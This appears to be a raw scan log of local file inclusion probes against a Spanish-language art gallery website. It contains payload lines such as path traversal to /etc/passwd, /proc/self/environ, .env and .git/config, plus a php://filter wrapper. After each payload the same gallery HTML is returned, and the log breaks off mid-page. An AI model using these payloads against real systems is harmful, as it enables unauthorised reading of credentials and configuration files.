</body>
</html>
[payload] file=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] file=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: include
[payload] include=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] include=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] include=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] include=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] include=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
